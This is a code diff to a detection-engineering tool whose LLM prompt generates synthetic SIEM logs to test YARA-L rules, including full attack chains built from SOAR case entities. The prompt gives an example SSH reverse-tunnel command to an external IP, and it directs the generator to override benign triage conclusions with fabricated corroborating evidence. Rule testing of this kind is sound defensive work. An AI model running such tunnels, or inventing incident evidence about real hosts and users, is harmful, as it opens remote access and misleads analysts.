@@ -69,38 +69,47 @@ CRITICAL RULES:
 """
 
 RULE_SYSTEM_PROMPT = """You are an elite Detection Engineer and Security Telemetry Specialist.
-Your task is to reverse-engineer and generate synthetic raw logs that will be parsed by Google SecOps (Chronicle SIEM) and trigger a specific YARA-L 2.0 detection rule.
+Your task is to reverse-engineer and generate synthetic raw logs that will be parsed by Google SecOps (Chronicle SIEM) and trigger a specific YARA-L 2.0 detection rule, while also synthesizing realistic surrounding multi-source attack telemetry when additional alert context is provided.
 
 You will be given:
 1. The target YARA-L detection rule (logic, metadata, MITRE techniques).
 2. The deconstructed UDM constraints (required event types, positive regex/string criteria, negative exclusions to avoid, thresholds, and time windows).
 3. The target log source type(s) and their detailed Schema Guides.
-4. The generation objective: 'fire' (trigger detection), 'evade' (negative test), or 'full-chain' (end-to-end simulation).
+4. The generation objective: 'fire' (trigger detection), 'evade' (negative test), or 'full-chain' (end-to-end simulation with pre-incident, trigger, and post-incident surrounding logs).
+5. Optional ADDITIONAL USER CONTEXT (such as a SOAR Case/Alert Triage Summary and Involved Entities).
 
 CRITICAL RULES:
 1. **Rule Satisfaction**:
-   - For 'fire': Ensure the generated logs contain the exact strings, regexes, parameters, and UDM fields specified in the positive constraints.
+   - For 'fire' and 'full-chain': Ensure the generated trigger log(s) contain the exact strings, regexes, parameters, and UDM fields specified in the positive constraints.
    - Strictly avoid matching any negative exclusion patterns (clauses with '!=') so the rule does not discard the event.
-   - If the rule requires a threshold (e.g. count > 5), generate at least that many distinct events within the specified match window.
-   - If the rule is a multi-event join, bind matching entity fields (e.g. same user, IP, or hostname) across the joined events in proper sequence.
-2. **Schema Fidelity**:
-   - Format each log line strictly according to the Schema Guide for the target log source (e.g. Windows Sysmon XML/Key-Value, CEF, JSON, Syslog).
-   - Ensure the fields that Google SecOps parsers use to populate the target UDM attributes (e.g. CommandLine, ParentImage, TargetUserName, IpAddress) are realistically placed in the raw log.
-3. **Relative Time Templating**:
-   - Use relative template tags:
+   - If the rule requires a threshold (e.g. count > 5), generate at least that many distinct trigger events within the specified match window.
+   - If the rule is a multi-event join, bind matching entity fields (e.g. same user, IP, asset_id, or hostname) across the joined events in proper sequence.
+2. **Entity Binding & Case Triage Reconstruction**:
+   - When ADDITIONAL USER CONTEXT is provided, you MUST reuse all exact external malicious IP addresses (e.g. `221.194.148.34`), internal IP addresses, AWS EC2 instance IDs (e.g. `i-0942348f80748b397`), hostnames (`ComputerName`), and usernames directly inside BOTH the YARA-L trigger event(s) AND the surrounding logs!
+   - For example, if the rule matches an SSH command line connecting to an external IP (`/ssh.*\s\w+@\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/`) and excludes `127.0.0.1` / RFC1918 private IPs, use `localhost` for the local port forwarding bind and the exact malicious external IP from the alert context as the SSH destination (e.g. `/usr/bin/ssh -N -R 8080:localhost:22 root@221.194.148.34`).
+   - If the input context is a SIEM/SOAR Triage Summary stating "no corroborating evidence was found" or "no further action is required", IGNORE that benign conclusion and synthesize the complete corroborating attack chain!
+3. **Schema Fidelity**:
+   - Format each log line strictly according to the Schema Guide for the target log source (e.g. CrowdStrike Falcon EDR `CS_EDR` JSON with all string values and 32-char hex `aid`, Windows Sysmon, AWS VPC Flow, AWS CloudTrail, Linux Syslog).
+   - Ensure the fields that Google SecOps parsers use to populate the target UDM attributes (e.g. `CommandLine`, `ImageFileName`, `aid`, `ComputerName`, `UserName`) are realistically placed in the raw log.
+4. **Relative Time Templating (Backdating to Anchor Time)**:
+   - Never hardcode static timestamps! Use relative template tags resolved against the Alert Anchor Timestamp (`0d0h0m0s`):
      * ISO 8601: `##$TimeStamp-0d0h5m0s$##`
-     * Unix Epoch: `##$Epoch-0d0h5m0s$##`
+     * Unix Epoch (seconds): `##$Epoch-0d0h5m0s$##`
+     * Unix Epoch (milliseconds): `##$EpochMillis-0d0h5m0s$##`
      * Syslog: `##$SyslogTime-0d0h5m0s$##`
-4. **Output Format**:
+5. **Output Format**:
    Return a single valid JSON object:
    ```json
    {
      "title": "Trigger simulation for <RULE_NAME>",
-     "summary": "Explanation of how the generated logs satisfy the YARA-L detection logic",
+     "summary": "Explanation of how the generated logs satisfy the YARA-L detection logic and surrounding scenario",
      "logs": {
-       "<LOG_TYPE>": [
+       "<LOG_TYPE_1>": [
          "log line 1",
          "log line 2"
+       ],
+       "<LOG_TYPE_2>": [
+         "log line 1"
        ]
      }
    }
@@ -423,8 +432,23 @@ Return ONLY the JSON array."""
     analysis = self.rule_analyzer.analyze(rule_obj)
 
     # Inferred log types if not provided
+    primary_trigger_type = (
+        analysis.suggested_log_types[0] if analysis.suggested_log_types else "WINDOWS_SYSMON"
+    )
     if not log_types:
-      log_types = analysis.suggested_log_types[:2] if analysis.suggested_log_types else ["WINDOWS_SYSMON"]
+      if additional_context and additional_context.strip() and outcome in ("full-chain", "fire"):
+        surrounding_types = self.infer_log_types(additional_context)
+        merged_types = [primary_trigger_type]
+        for st in surrounding_types:
+          if st.upper() not in merged_types and len(merged_types) < 4:
+            merged_types.append(st.upper())
+        log_types = merged_types
+      else:
+        log_types = analysis.suggested_log_types[:2] if analysis.suggested_log_types else ["WINDOWS_SYSMON"]
+    else:
+      # Ensure the rule's primary trigger log type is always included first
+      if primary_trigger_type not in [lt.upper() for lt in log_types]:
+        log_types = [primary_trigger_type] + list(log_types)
 
     # Target event count
     target_count = max(count or 1, analysis.threshold_count, 1)
@@ -432,6 +456,7 @@ Return ONLY the JSON array."""
     rule_scenario_prompt = f"""### TARGET YARA-L DETECTION RULE:
 Name: {rule_obj.display_name}
 Rule ID: {rule_obj.rule_id}
+Precision: {rule_obj.raw_data.get('precision', 'PRECISE')}
 MITRE Techniques: {', '.join(analysis.techniques) if analysis.techniques else 'N/A'}
 MITRE Tactics: {', '.join(analysis.tactics) if analysis.tactics else 'N/A'}
 
@@ -442,12 +467,16 @@ MITRE Tactics: {', '.join(analysis.tactics) if analysis.tactics else 'N/A'}
 
 ### TRIGGER ANALYSIS & UDM REQUIREMENTS:
 {analysis.summary}
+- Primary Trigger Log Type (MUST generate the rule-triggering event(s) in this log source): `{primary_trigger_type}`
 
 ### SCENARIO GENERATION OBJECTIVE:
 Objective: '{outcome.upper()}'
-- If 'fire': You MUST generate logs that trigger this detection. Every positive constraint in the rule must be matched. Exclusions MUST be strictly avoided. Ensure at least {target_count} matching event(s) are generated.
+- If 'fire': You MUST generate logs in `{primary_trigger_type}` that trigger this detection. Every positive constraint in the rule must be matched. Exclusions MUST be strictly avoided. Ensure at least {analysis.threshold_count} matching trigger event(s) are generated, plus supporting telemetry across `{', '.join(log_types)}` up to ~{target_count} total events.
 - If 'evade' or 'negative': Deliberately generate activity that resembles the threat but hits at least one exclusion clause (to verify false positive defense).
-- If 'full-chain': Generate pre-incident recon, followed by the {target_count} trigger events, followed by post-incident activity.
+- If 'full-chain': Generate a cohesive multi-source attack timeline (~{target_count} total events across `{', '.join(log_types)}`):
+  1. Pre-incident recon / initial access / authentication events in surrounding log sources,
+  2. The exact {analysis.threshold_count}+ rule-triggering event(s) in `{primary_trigger_type}` that 100% satisfy every YARA-L positive constraint and avoid every negative exclusion,
+  3. Post-incident network/cloud/system corroborating events.
 
 Generate raw logs in the specified log format(s) ({', '.join(log_types)}) that Google SecOps parsers will convert into UDM events satisfying the rule.
 """
